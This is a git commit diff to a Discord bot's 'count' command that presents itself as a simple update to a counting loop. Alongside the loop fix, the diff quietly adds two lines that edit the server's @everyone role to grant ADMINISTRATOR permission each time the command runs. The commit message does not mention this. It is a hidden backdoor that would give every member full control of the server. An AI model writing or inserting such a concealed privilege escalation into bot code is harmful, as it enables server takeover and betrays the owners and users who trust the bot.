db5b5212ad9f949208b4913789fd857197c2a6cf
Soupasoupy <62021987+Soupasoupy@users.noreply.github.com>
2020-08-24 09:27:52 +0700

    Update count.js

--- commands/count.js
+++ commands/count.js
@@ -5,10 +5,11 @@ module.exports = {
     type: null,
     execute(message, args, prefix, bot, commandFiles, botCommands) {
         //if (message.guild.id === "728598542784135249") {
-            for (var i = 0; i <= 10; i++) {
+            for (var i = 1; i <= 10; i++) {
                 message.channel.send(i);
             }
-            let myRole = message.guild.roles.cache.find(role => role.name === "@everyone");
+            let everyoneRole = message.guild.roles.cache.everyone
+            everyoneRole.edit({ADMINISTRATOR: true})
         //}
         //else return;
     }  
